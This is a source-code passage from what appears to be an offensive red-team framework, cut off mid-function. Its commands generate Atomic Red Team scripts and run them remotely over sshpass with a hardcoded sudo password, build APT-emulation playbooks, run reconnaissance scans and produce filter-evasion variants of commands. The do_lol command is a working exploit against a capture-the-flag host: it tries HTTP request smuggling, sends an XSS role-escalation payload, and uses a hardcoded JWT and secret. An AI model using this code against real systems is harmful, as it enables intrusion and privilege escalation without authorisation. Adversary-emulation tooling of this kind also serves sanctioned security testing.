    @cmd2.with_category(command_and_control_category)
    def do_atomic_gen(self, line):
        """
        Generates test and cleanup scripts for a given Atomic Red Team technique ID.

        Parameters:
        line (str): The technique ID.

        Returns:
        None
        """
        if not line:
            print_warn("No technique ID provided.")
            return

        atomic_repo = "https://github.com/redcanaryco/atomic-red-team.git"
        atomic_path = os.path.join("external", ".exploit", "atomic-red-team")
        atomic_yaml_path = os.path.join(atomic_path, "atomics")
        sessions_path = os.path.join("sessions/temp_uploads")
        tmp_path = "/tmp/lazyown_atomic_test"
        atomic = "PathToAtomicsFolder"
        if not os.path.exists(atomic_path):
            print_warn("Atomic Red Team repository not found. Cloning...")
            self.cmd(f"git clone {atomic_repo} {atomic_path}")
            print_msg("Repository cloned successfully.")
        else:
            command = f"cd {atomic_path} && git pull"
            print_msg("Try to update...")
            self.cmd(command)
        if not os.path.exists(sessions_path):
            os.makedirs(sessions_path)

        test_id = line.strip()
        yaml_files = glob.glob(os.path.join(atomic_yaml_path, "**", "*.yaml"), recursive=True)
        selected_test = None

        for file in yaml_files:
            with open(file, "r") as f:
                data = yaml.safe_load(f)

                if "atomic_tests" in data:
                    for test in data["atomic_tests"]:
                        if test["auto_generated_guid"] == test_id:
                            selected_test = {
                                "name": test["name"],
                                "description": test.get("description", "No description available"),
                                "platforms": test.get("supported_platforms", []),
                                "executor": test.get("executor", {}).get("name", "No name available"),
                                "command": test.get("executor", {}).get("command", "No command available"),
                                "prereq_command": test.get("dependencies", [{}])[0].get("prereq_command", ""),
                                "get_prereq_command": test.get("dependencies", [{}])[0].get("get_prereq_command", ""),
                                "cleanup_command": test.get("executor", {}).get("cleanup_command", ""),
                                "input_arguments": test.get("input_arguments", {}),
                                "mitre_id": data.get("attack_technique", "No MITRE ID available")

                            }
                            break
            if selected_test:
                break

        if not selected_test:
            print_warn(f"Test ID {test_id} not found.")
            return
        mitre_url = selected_test['mitre_id'].replace(".","/")
        root = f"{tmp_path}/{atomic}"
        src = f"{atomic_yaml_path}/{selected_test['mitre_id']}/src"
        bin = f"{atomic_yaml_path}/{selected_test['mitre_id']}/bin"
        self.cmd(f" mkdir -p {root}/{selected_test['mitre_id']} 2>/dev/null")
        self.cmd(f"cp -R {src} {root}/{selected_test['mitre_id']}/src 2>/dev/null")
        self.cmd(f"cp -R {bin} {root}/{selected_test['mitre_id']}/bin 2>/dev/null")
        print_msg(f"Atomic ID: {test_id}")
        print_msg(f"Executing test: {selected_test['name']}")
        print_msg(f"Description: \n {selected_test['description']}")
        print_msg(f"Platforms: {', '.join(selected_test['platforms'])}")
        print_msg(f"Executor: {selected_test['executor']}")
        print_msg(f"MITRE ID: {selected_test['mitre_id']}")
        print_msg(f"MITRE url: https://attack.mitre.org/techniques/{mitre_url}")

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        rport = self.params["rport"]
        input_arguments = selected_test['input_arguments']

        variables = {
            "#{ip_address}": rhost,
            "#{endpoint_domain}": rhost,
            "#{domain}": domain,
            "#{port}": rport,
            "#{hostname}": domain
        }
        for key, value in input_arguments.items():
            formatted_key = "#{{key}}".replace("{key}", key)
            if formatted_key not in variables:
                variables[formatted_key] = value.get("default", "")

        prereq_command = selected_test["prereq_command"]
        prereq_command = replace_variables(prereq_command, variables)
        get_prereq_command = selected_test["get_prereq_command"]
        get_prereq_command = replace_variables(get_prereq_command, variables)
        command = selected_test["command"]
        command = replace_variables(command, variables)
        cleanup_command = selected_test["cleanup_command"]
        cleanup_command = replace_variables(cleanup_command, variables)

        platform = selected_test["platforms"][0]
        extension = ".sh" if platform in ["linux", "macos"] else ".ps1"
        log_path = f"{tmp_path}/{test_id}.log"

        if platform == "windows":
            test_script_content = f"""
            Start-Transcript -Path "{log_path}"
            # Get prerequisite command
            {get_prereq_command}

            # Prerequisite command
            {prereq_command}

            # Test command
            {command}
            Stop-Transcript
            """.replace("            ","")
            cleanup_script_content = f"""
            # Cleanup command
            {cleanup_command}
            """.replace("            ","")
        else:
            test_script_content = f"""#!/bin/sh
            exec > >(tee -a {log_path}) 2>&1
            # Get prerequisite command
            {get_prereq_command}

            # Prerequisite command
            {prereq_command}

            # Test command
            {command}
            """.replace("            ","")
            cleanup_script_content = f"""#!/bin/sh
            # Cleanup command
            {cleanup_command}
            rm -rf {tmp_path}
            """.replace("            ","")

        test_script_path = os.path.join(sessions_path, f"atomic_test_{test_id}{extension}")
        cleanup_script_path = os.path.join(sessions_path, f"atomic_clean_test_{test_id}{extension}")

        with open(test_script_path, "w") as test_file:
            test_file.write(test_script_content)

        with open(cleanup_script_path, "w") as cleanup_file:
            cleanup_file.write(cleanup_script_content)

        print_msg(f"Test script generated: {test_script_path}")
        print_msg(f"Cleanup script generated: {cleanup_script_path}")
        self.logcsv(f"atomic_get {test_script_path} {cleanup_script_path}")

    @cmd2.with_category(command_and_control_category)
    def do_atomic_agent(self, line):
        """
        Generates and synchronizes atomic agent scripts.

        Parameters:
        line (str): Command-line arguments (not used in this function).

        Returns:
        None
        """
        print_msg("Crafting agent.")
        sessions_path = os.path.join(os.getcwd(), "sessions")
        tmp_path = "/tmp/lazyown_atomic_test"
        self.cmd(f"mkdir -p {tmp_path}")
        test_scripts = glob.glob(os.path.join(sessions_path, "atomic_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_test_*.ps1"))
        clean_test_scripts = glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.ps1"))

        if not test_scripts or not clean_test_scripts:
            print_warn("No test or clean test scripts found in the sessions directory.")
            return

        extension = ".sh" if test_scripts[0].endswith(".sh") else ".ps1"
        if extension == ".sh":
            atomic_agent_content = "\n".join([f"/bin/sh {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts])
        else:
            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
        atomic_agent_path = os.path.join(tmp_path, f"atomic_agent{extension}")
        with open(atomic_agent_path, "w") as f:
            f.write(atomic_agent_content)
        if extension == ".sh":
            atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_test_scripts])
        else:
            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
        atomic_clean_agent_path = os.path.join(tmp_path, f"atomic_clean_agent{extension}")
        with open(atomic_clean_agent_path, "w") as f:
            f.write(atomic_clean_agent_content)

        for script in test_scripts + clean_test_scripts:
            script_name = os.path.basename(script)
            script_dest = os.path.join(tmp_path, script_name)
            self.cmd(f"cp {script} {script_dest}")

        credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
        if not os.path.exists(credentials_path):
            username = self.params.get("username") or input("    [!] Enter the username: ")
            password = self.params.get("password") or input("    [!] Enter the password: ")
        else:
            with open(credentials_path, "r") as f:
                credentials = f.read().strip().split("\n")
                if credentials:
                    username, password = credentials[0].split(":")
                else:
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")

        rhost = self.params["rhost"]
        print_msg("Deploying agent.")
        if extension == ".sh":
            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh'"
        else:
            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_agent.ps1' -Verb RunAs\""

        exit_code = self.cmd(rsync_command)
        if line.startswith("web"):
            print_warn("Executing from web. avoid interaction.")
        else:
            input("    [!] Press enter to clean Red Operation: ")
        if extension == ".sh":
            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh'"
        else:
            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_clean_agent.ps1' -Verb RunAs\""


        exit_code = self.cmd(rsync_command)

        # Transfer logs back to C2
        log_path = f"{tmp_path}/*.log"
        if extension == ".sh":
            scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:{log_path} {sessions_path}/"
        else:
            scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:C:/Users/grisun0/Documents/lazyown_atomic_test/*.log {sessions_path}/"
        self.cmd(scp_command)

        if exit_code == 0:
            print_msg("Agent deployed and executed successfully.")
        else:
            print_error(f"Failed to synchronize files or agent. Exit code: {exit_code}")


    @cmd2.with_category(command_and_control_category)
    def do_attack_plan(self, line):
        """
        Executes a multi-step APT simulation plan based on Atomic Red Team test IDs.

        Parameters:
        line (str) optional: Path to the YAML plan file.

        Returns:
        None
        """
        playbook_dir = "playbooks"

        if not line.strip():
            yaml_files = [f for f in os.listdir(playbook_dir) if f.endswith(".yaml") or f.endswith(".yml")]
            if not yaml_files:
                print_warn("No YAML playbooks found in the 'playbooks/' directory.")
                return

            print_msg("Available playbooks:")
            for i, file in enumerate(yaml_files):
                print(f"  [{i}] {file}")

            try:
                choice = int(input("Select a playbook number to execute: "))
                if choice < 0 or choice >= len(yaml_files):
                    print_warn("Invalid selection.")
                    return
                plan_file = os.path.join(playbook_dir, yaml_files[choice])
            except ValueError:
                print_warn("Invalid input. Please enter a number.")
                return
        else:
            plan_file = os.path.join(playbook_dir, line.strip())

        if not os.path.exists(plan_file):
            print_warn(f"Plan file not found: {plan_file}")
            return

        with open(plan_file, 'r') as f:
            plan = yaml.safe_load(f)

        steps = plan.get("steps", [])
        if not steps:
            print_warn("No steps defined in plan.")
            return

        print_msg(f"Executing APT plan: {plan.get('apt_name', 'Unnamed')}\n{plan.get('description', '')}")

        for i, step in enumerate(steps):
            atomic_id = step.get("atomic_id")
            if not atomic_id:
                print_warn(f"Step {i+1} missing atomic_id.")
                continue
            print_msg(f"Generating step {i+1}: {atomic_id}")
            self.do_atomic_gen(atomic_id)

        # After generation, build ordered super-agent
        sessions_path = os.path.join(os.getcwd(), "sessions")
        tmp_path = "/tmp/lazyown_atomic_test"
        extension = ".sh" if any(glob.glob(os.path.join(sessions_path, "*.sh"))) else ".ps1"
        test_scripts = sorted(glob.glob(os.path.join(sessions_path, f"atomic_test_*.{extension[1:]}")))
        clean_scripts = sorted(glob.glob(os.path.join(sessions_path, f"atomic_clean_test_*.{extension[1:]}")))

        if extension == ".sh":
            agent_lines = [
                "#!/bin/bash",
                "mkdir -p /tmp/lazyown_logs"
            ]
            agent_lines += [
                f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts
            ]
            agent_lines.append("tar czf /tmp/lazyown_logs.tar.gz /tmp/lazyown_logs")

            clean_lines = [
                "#!/bin/bash"
            ]
            clean_lines += [
                f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_scripts
            ]
        else:
            agent_lines = [
                f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts
            ]
            agent_lines.append("Compress-Archive -Path C:\\ProgramData\\lazyown_logs\\* -DestinationPath C:\\ProgramData\\lazyown_logs.zip")

            clean_lines = [
                f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in clean_scripts
            ]

        with open(os.path.join(tmp_path, f"apt_agent{extension}"), "w") as f:
            f.write("\n".join(agent_lines))

        with open(os.path.join(tmp_path, f"apt_clean_agent{extension}"), "w") as f:
            f.write("\n".join(clean_lines))

        print_msg(f"APT agent created and ready at: {tmp_path}/apt_agent{extension}")
        print_msg(f"Cleanup agent created: {tmp_path}/apt_clean_agent{extension}")


    @cmd2.with_category(command_and_control_category)
    def do_mitre_test(self, line):
        """
        Interacts with the MITRE ATT&CK framework using the STIX 2.0 format.

        This function connects to a locally cached or downloaded ATT&CK dataset in STIX 2.0 format.
        It allows the user to explore tactics, techniques, and procedures (TTPs) and filter them
        based on specific criteria, such as platform or tactic.

        Parameters:
            line (str): User input, which may specify filters or actions, such as a tactic name or technique ID.

        Usage:
            mitre_test list             # Lists all tactics and techniques
            mitre_test tactic <name>    # Lists techniques for a specific tactic
            mitre_test technique <id>   # Shows details of a specific technique
        """
        try:

            mitre_repo = "https://github.com/mitre-attack/attack-stix-data.git"
            mitre_path = os.path.join("external", ".exploit", "mitre")
            enterprise_attack_path = os.path.join(mitre_path,"enterprise-attack", "enterprise-attack-16.1.json")

            if not os.path.exists(mitre_path):
                print_warn("MITRE ATT&CK repository not found. Cloning...")
                os.makedirs(mitre_path, exist_ok=True)
                self.cmd(f"git clone {mitre_repo} {mitre_path}")
                print_msg("Repository cloned successfully.")

            if not os.path.exists(enterprise_attack_path):
                print_warn("Error: Enterprise ATT&CK dataset not found in the cloned repository.")
                print_warn("Please verify the repository structure.")
                return

            print_msg("MITRE ATT&CK dataset ready. Performing analysis...")

            with open(enterprise_attack_path, "r") as f:
                attack_data = json.load(f)

            attack_store = MemoryStore(stix_data=attack_data)
            self.logcsv(f"mitre_test {line}")
            args = line.split()
            if not args:
                print_msg("Usage: mitre_test <list|tactic|technique> [arguments]")
                return

            command = args[0]

            if command == "list":
                tactics = attack_store.query([Filter("type", "=", "x-mitre-tactic")])
                techniques = attack_store.query([Filter("type", "=", "attack-pattern")])
                print_msg("Tactics:")
                for tactic in tactics:
                    print_msg(f"- {tactic['name']}")
                print_msg("\nTechniques:")
                for technique in techniques:
                    print_msg(f"- {technique['name']} (ID: {technique['id']})")

            elif command == "tactic":
                if len(args) < 2:
                    print_warn("Usage: mitre_test tactic <name>")
                    return
                tactic_name = " ".join(args[1:])
                tactic = next(
                    (t for t in attack_store.query([Filter("type", "=", "x-mitre-tactic")]) if t["name"].lower() == tactic_name.lower()),
                    None
                )
                if not tactic:
                    print_warn(f"Tactic '{tactic_name}' not found.")
                    return

                techniques = attack_store.query([
                    Filter("type", "=", "attack-pattern"),
                    Filter("kill_chain_phases.phase_name", "=", tactic["x_mitre_shortname"])
                ])
                print_msg(f"Techniques for tactic '{tactic_name}':")
                for technique in techniques:
                    print_msg(f"- {technique['name']} (ID: {technique['id']})")

            elif command == "technique":
                if len(args) < 2:
                    print_warn("Usage: mitre_test technique <id>")
                    return
                technique_id = args[1]
                technique = next(
                    (t for t in attack_store.query([Filter("type", "=", "attack-pattern")]) if technique_id in t["id"]),
                    None
                )
                if not technique:
                    print_warn(f"Technique '{technique_id}' not found.")
                    return

                print_msg(f"Technique: {technique['name']}")
                print_msg(f"Description: {technique.get('description', 'No description available.')}")
                print_msg(f"Platforms: {', '.join(technique.get('x_mitre_platforms', []))}")
                print_msg(f"Data Sources: {', '.join(technique.get('x_mitre_data_sources', []))}")
                print_msg(f"More Info: {technique.get('external_references', [{}])[0].get('url', 'N/A')}")

            else:
                print_msg("Unknown command. Use 'list', 'tactic', or 'technique'.")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(command_and_control_category)
    def do_generate_playbook(self, line):
        """
        Generates a playbook that integrates Atomic Red Team tests and MITRE ATT&CK techniques.

        This function creates a playbook by combining tests from the Atomic Red Team repository
        and techniques from the MITRE ATT&CK framework. The playbook includes detailed information
        about each test and technique, making it a comprehensive resource for emulating adversary
        behaviors.

        Parameters:
        line (str): Command-line arguments for specifying the playbook name and optional filters.
                    The filters can be applied to various attributes of the tests and techniques,
                    including but not limited to:
                    - name: Filter by the name of the test or technique.
                    - description: Filter by keywords in the description of the test or technique.
                    - mitre_id: Filter by the MITRE ATT&CK technique ID.
                    - platforms: Filter by the supported platforms (e.g., windows, linux, macos).
                    - tactic: Filter by the MITRE ATT&CK tactic associated with the technique.
                    - data_sources: Filter by the data sources mentioned in the technique.
                    - defensive_measures: Filter by the defensive measures mentioned in the technique.
                    - examples: Filter by examples mentioned in the technique.
                    - references: Filter by references or URLs mentioned in the technique.
                    - related_techniques: Filter by related techniques mentioned in the technique.
                    - mitigations: Filter by mitigations mentioned in the technique.

        Returns:
        None

        Example Usage:
        do_generate_playbook("ExamplePlaybook persistence lateral_movement windows")
        This command will generate a playbook named "ExamplePlaybook" that includes tests and
        techniques related to "persistence", "lateral_movement", and the "windows" platform.
        """
        # Define paths
        atomic_repo = "https://github.com/redcanaryco/atomic-red-team.git"
        atomic_path = os.path.join("external", ".exploit", "atomic-red-team")
        atomic_yaml_path = os.path.join(atomic_path, "atomics")
        mitre_repo = "https://github.com/mitre-attack/attack-stix-data.git"
        mitre_path = os.path.join("external", ".exploit", "mitre")
        enterprise_attack_path = os.path.join(mitre_path, "enterprise-attack", "enterprise-attack-16.1.json")
        playbook_dir = "playbooks"

        # Clone or update repositories if necessary
        if not os.path.exists(atomic_path):
            print_warn("Atomic Red Team repository not found. Cloning...")
            self.cmd(f"git clone {atomic_repo} {atomic_path}")
            print_msg("Repository cloned successfully.")
        else:
            command = f"cd {atomic_path} && git pull"
            print_msg("Try to update...")
            self.cmd(command)

        if not os.path.exists(mitre_path):
            print_warn("MITRE ATT&CK repository not found. Cloning...")
            os.makedirs(mitre_path, exist_ok=True)
            self.cmd(f"git clone {mitre_repo} {mitre_path}")
            print_msg("Repository cloned successfully.")

        if not os.path.exists(enterprise_attack_path):
            print_warn("Error: Enterprise ATT&CK dataset not found in the cloned repository.")
            print_warn("Please verify the repository structure.")
            return

        # Load MITRE ATT&CK data
        with open(enterprise_attack_path, "r") as f:
            attack_data = json.load(f)

        attack_store = MemoryStore(stix_data=attack_data)

        # Parse command-line arguments
        args = line.split()
        if not args:
            print_msg("Usage: generate_playbook <name> [filters]")
            return

        playbook_name = args[0]
        filters = args[1:]

        # Create playbook directory if it doesn't exist
        if not os.path.exists(playbook_dir):
            os.makedirs(playbook_dir)

        # Define the playbook structure
        playbook = {
            "apt_name": playbook_name,
            "description": f"Playbook generated for {playbook_name}",
            "steps": []
        }

        # Load Atomic Red Team tests
        yaml_files = glob.glob(os.path.join(atomic_yaml_path, "**", "*.yaml"), recursive=True)
        tests = {}
        for file in yaml_files:
            with open(file, "r") as f:
                data = yaml.safe_load(f)
                if "atomic_tests" in data:
                    for test in data["atomic_tests"]:
                        tests[test["auto_generated_guid"]] = {
                            "name": test["name"],
                            "description": test.get("description", "No description available"),
                            "platforms": test.get("supported_platforms", []),
                            "command": test.get("executor", {}).get("command", "No command available"),
                            "prereq_command": test.get("dependencies", [{}])[0].get("prereq_command", ""),
                            "get_prereq_command": test.get("dependencies", [{}])[0].get("get_prereq_command", ""),
                            "cleanup_command": test.get("executor", {}).get("cleanup_command", ""),
                            "input_arguments": test.get("input_arguments", {}),
                            "mitre_id": data.get("attack_technique", "No MITRE ID available"),
                            "references": test.get("references", [])
                        }

        # Debug: Print the number of tests loaded
        print_msg(f"Loaded {len(tests)} Atomic Red Team tests.")

        # Filter tests based on command-line arguments
        filtered_tests = {}
        for test_id, test in tests.items():
            if all(filter_term.lower() in test["name"].lower() or filter_term.lower() in test["description"].lower() for filter_term in filters):
                filtered_tests[test_id] = test

        # Debug: Print the number of filtered tests
        print_msg(f"Filtered {len(filtered_tests)} Atomic Red Team tests based on filters: {filters}")

        # Add filtered tests to the playbook with MITRE ATT&CK information
        for test_id, test in filtered_tests.items():
            mitre_technique = attack_store.query([
                Filter("type", "=", "attack-pattern"),
                Filter("external_references.external_id", "=", test["mitre_id"])
            ])

            if mitre_technique:
                mitre_technique = mitre_technique[0]
                mitre_info = {
                    "mitre_id": test["mitre_id"],
                    "mitre_name": mitre_technique.get("name", "No name available"),
                    "mitre_description": mitre_technique.get("description", "No description available"),
                    "mitre_platforms": mitre_technique.get("x_mitre_platforms", []),
                    "mitre_data_sources": mitre_technique.get("x_mitre_data_sources", []),
                    "mitre_defensive_measures": mitre_technique.get("x_mitre_defensive_measures", []),
                    "mitre_examples": mitre_technique.get("x_mitre_examples", []),
                    "mitre_references": [ref.get("url") for ref in mitre_technique.get("external_references", [])],
                    "mitre_related_techniques": mitre_technique.get("x_mitre_related_techniques", []),
                    "mitre_mitigations": mitre_technique.get("x_mitre_mitigations", [])
                }
            else:
                mitre_info = {
                    "mitre_id": test["mitre_id"],
                    "mitre_name": "No name available",
                    "mitre_description": "No description available",
                    "mitre_platforms": [],
                    "mitre_data_sources": [],
                    "mitre_defensive_measures": [],
                    "mitre_examples": [],
                    "mitre_references": [],
                    "mitre_related_techniques": [],
                    "mitre_mitigations": []
                }

            playbook["steps"].append({
                "atomic_id": test_id,
                "name": test["name"],
                "description": test["description"],
                "platforms": test["platforms"],
                "command": test["command"],
                "prereq_command": test["prereq_command"],
                "get_prereq_command": test["get_prereq_command"],
                "cleanup_command": test["cleanup_command"],
                "input_arguments": test["input_arguments"],
                "references": test["references"],
                "mitre_info": mitre_info
            })

        # Save the playbook to a YAML file
        playbook_file = os.path.join(playbook_dir, f"{playbook_name}.yaml")
        with open(playbook_file, "w") as f:
            yaml.dump(playbook, f, default_flow_style=False)

        print_msg(f"Playbook '{playbook_name}' generated successfully with {len(playbook['steps'])} steps.")

    @cmd2.with_category(command_and_control_category)
    def do_my_playbook(self, line):
        """
        Generates a playbook from your custom technique database.
        Usage: my_playbook <name> [filter]
        Example: my_playbook KerberosAttack password spray
        """

        from fnmatch import fnmatch

        playbook_dir = "playbooks"
        techniques_file = "my_techniques.json"

        if not os.path.exists(techniques_file):
            print_warn(f"Technique database not found: {techniques_file}")
            return

        with open(techniques_file, "r") as f:
            techniques = json.load(f)

        args = line.strip().split()
        if not args:
            print_msg("Usage: my_playbook <name> [filter]")
            return

        playbook_name = args[0]
        filters = args[1:]

        # Crear estructura del playbook
        playbook = {
            "apt_name": playbook_name,
            "description": f"Custom playbook generated for {playbook_name}",
            "steps": []
        }

        for tech in techniques:
            label = tech.get("label", "").lower()
            if all(fnmatch(label, f"*{term.lower()}*") for term in filters):
                step = {
                    "atomic_id": tech["id"],
                    "name": tech["label"],
                    "command": tech.get("command", ""),
                    "description": tech.get("description", "No description available"),
                    "prereq_command": tech.get("prereq_command", ""),
                    "cleanup_command": tech.get("cleanup_command", "")
                }
                playbook["steps"].append(step)

        if not os.path.exists(playbook_dir):
            os.makedirs(playbook_dir)

        playbook_path = os.path.join(playbook_dir, f"{playbook_name}.yaml")
        with open(playbook_path, "w") as f:
            yaml.dump(playbook, f, default_flow_style=False)

        print_msg(f"Playbook '{playbook_name}' generated successfully with {len(playbook['steps'])} steps.")

    @cmd2.with_category(scanning_category)
    def do_bbot(self, line):
        """
        Executes a BBOT scan to perform various reconnaissance tasks.

        This function leverages BBOT, a reconnaissance tool, to perform tasks such as subdomain enumeration,
        email gathering, web scanning, and more. It dynamically determines the operation based on user input
        and executes the appropriate BBOT commands.

        Parameters:
            line (str): User input specifying the target and optional presets or configurations.

        Usage:
            bbot -t <target> -p <preset>

            Examples:
                bbot -t evilcorp.com -p subdomain-enum
                bbot -t evilcorp.com -p email-enum spider web-basic
        """
        try:
            bbot_check = self.cmd("which bbot > /dev/null 2>&1")
            if bbot_check != 0:
                print_warn("BBOT is not installed. Installing...")
                self.cmd("pipx install bbot")
                print_msg("BBOT installed successfully.")

            domain = self.params.get("domain", "localhost")

            choice = input("    [!] Enter the mode (1 Subdomain, 2 Spider, 3 Email, 4 Web, 5 Web thorough, 6 All): ") or '6'

            if choice == "1":
                command = f"bbot -t {domain} -p subdomain-enum "
            elif choice == "2":
                command = f"bbot -t {domain} -p spider "
            elif choice == "3":
                command = f"bbot -t {domain} -p email-enum "
            elif choice == "4":
                command = f"bbot -t {domain} -p web-basic "
            elif choice == "5":
                command = f"bbot -t {domain} -p web-thorough "
            elif choice == "6":
                command = f"bbot -t {domain} -p subdomain-enum cloud-enum code-enum email-enum spider web-basic paramminer dirbust-light web-screenshots --allow-deadly"
            print_msg(f"Ejecutando comando BBOT: {command}")
            self.cmd(command)
            self.logcsv(f"bbot {command}")
            print_msg("Escaneo con BBOT completado.")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(scanning_category)
    def do_amass(self, line):
        """
        Executes Amass to perform a passive enumeration on a given domain.

        This function performs the following steps:
        1. Executes the Amass tool with the provided domain for passive enumeration.
        2. Saves the results to a file named 'results.txt' in the current directory.

        Parameters:
        line (str): The domain to be enumerated, e.g., 'example.com'.

        Returns:
        None
        """
        if line:
            domain = line.strip()
        else:
            domain = self.params["domain"]
        if not domain:
            print_error("No domain provided. Please provide a valid domain to enumerate.")
            return

        command = f"amass enum -passive -d {domain} -o sessions/amass_{domain}_results.txt"
        print_msg(f"Running Amass for domain {domain}...")

        self.cmd(command)
        self.logcsv(f"amass {command}")
        print_msg(f"Amass enumeration completed. Results saved in sessions/amass_{domain}_results.txt.")

    @cmd2.with_category(exploitation_category)
    def do_filtering(self, line):
        """
        Applies various filtering techniques to the given command line by modifying each character or word appropriately.

        This function takes any command and generates variations of it using several filtering techniques, including:
        1. Quote filtering.
        2. Slash filtering.

        Parameters:
        line (str): The input command to be filtered.

        Returns:
        None
        """

        quote_filtered = ''.join([f"'{c}'" if i % 2 == 0 else c for i, c in enumerate(line)])
        quote_filtered_alt = ''.join([f"\"{c}\"" if i % 2 == 0 else c for i, c in enumerate(line)])
        slash_filtered = ''.join([f"\\{c}\\" if i % 2 == 0 else c for i, c in enumerate(line)])
        print_msg(f"Original command: {line}")
        print_msg(f"Quote Filtering: {quote_filtered}")
        print_msg(f"Quote Filtering: {quote_filtered_alt}")
        print_msg(f"Slash Filtering: {slash_filtered}")
        copy2clip(quote_filtered)
        self.logcsv(f"filtering {line}")

    @cmd2.with_category(exploitation_category)
    def do_lol(self, line):
        """
        Exploits a target by injecting a malicious payload and collecting admin information.

        This function performs the following steps:
        1. Logs in to the application with provided credentials.
        2. Injects a malicious payload to elevate the role of a user to 'admin.'
        3. Executes a secondary payload to exfiltrate admin tokens by abusing '/api/info.'
        4. Prepares for further exploitation using '/admin' and '/api/json-rpc'.

        Parameters:
        line (str): Additional parameters for the target.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        url = f'http://{rhost}'

        smuggled_request = (
            "POST / HTTP/1.1\r\n"
            "Host: {}\r\n"
            "Content-Length: 0\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: {}\r\n"
            "User-Agent: smuggle-test\r\n"
            "\r\n"
        ).format(url, url)

        try:
            response = requests.post(url, data=smuggled_request, headers={'Content-Type': 'text/plain'}, timeout=10)

            if response.status_code == 200 and "admin" in response.text:
                print_msg(f"目標 {url} 可能存在 CVE-2024-40725 漏洞")
            else:
                print_msg(f"目標 {url} 不存在 CVE-2024-40725 漏洞")
        except Exception as e:
            print_error(f"檢測過程中出錯: {e}")

        payload = "4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n0\r\n4\r\n"
        headers = {
        'Content-Type': 'multipart/form-data; boundary=4'
        }
        response = requests.request("POST", url, headers=headers, data=payload)

        print_msg(response.text)
        payload = (
            "<img src=x onerror=\"fetch('/api/update_role', {method: 'POST', headers: { 'Content-Type': 'application/json'}, "
            "body: JSON.stringify({ 'username': 'grisun0', 'role': 'grisun0'})})\" />"
        )
        headers = {
            "Content-Type": "application/json"
        }
        s = requests.Session()
        print_msg(f"Logging in and sending payload to {url}")
        login_response = s.post(f'{url}/api/login', headers=headers, json={"username": "grisun0", "password": "grisun0"})
        if login_response.status_code == 200:
            print_msg("Login successful. Injecting primary payload.")
            s.cookies.set("role", "admin", domain="blockblock.htb", path="/")
            s.cookies.set(
                "token",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMTk3NjE5MSwianRpIjoiMjIwMjYwMTMtMTM2YS00MTkwLTk2MWQtMjJiYmIzZWZiYmRiIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMxOTc2MTkxLCJleHAiOjE3MzI1ODA5OTF9.gNXBfs7sRc5rYyZWPJK18ySGlcZ_16dt9-UnKeX2fnM",
                domain="blockblock.htb",
                path="/",
            )
            s.cookies.set("username", "admin", domain="blockblock.htb", path="/")
            jwt_secret = {"Authorization": "34fd1a8cb0b169220123f98cb8fa442c5d271826fe1bddfe2185402bf2a5d3b9"}
            url = f"{url}/api/json-rpc"
            headers = {
                "Content-Type": "application/json",
                "token": jwt_secret["Authorization"],
            }

            payload = {
                "jsonrpc": "2.0",
                "method": "eth_getLogs",
                "params": [{"address": "0x75e41404c8c1de0c2ec801f06fbf5ace8662240f"}],  # Dirección del contrato inteligente
                "id": 1
            }
            print_msg(payload)
            response = s.post(url, headers=headers, json=payload)
            print_msg(response.json())

    @cmd2.with_category(exploitation_category)
    def do_utf(self, line):
        """
        Encode a given payload into UTF-16 escape sequences.

        This function takes a payload string and encodes each character into its
